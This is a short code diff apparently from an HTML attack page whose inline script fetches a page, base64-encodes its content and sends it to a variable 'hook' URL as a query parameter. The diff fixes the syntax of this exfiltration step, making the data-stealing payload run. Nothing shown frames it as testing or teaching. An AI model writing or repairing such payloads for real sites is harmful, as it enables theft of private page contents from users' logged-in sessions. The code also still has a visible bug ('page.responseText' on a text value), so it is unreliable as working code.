@@ -13,9 +13,8 @@
 			function(response){
 				return response.text()
 			}).then(function(page){
-				fetch(hook + "?page=" + window.btoa(xhr.responseText)).then('Ok','Error')
-			});
-	);
+				fetch(hook + "?page=" + window.btoa(page.responseText)).then('Ok','Error');
+			}));
 </script>
 </body>
 </html>
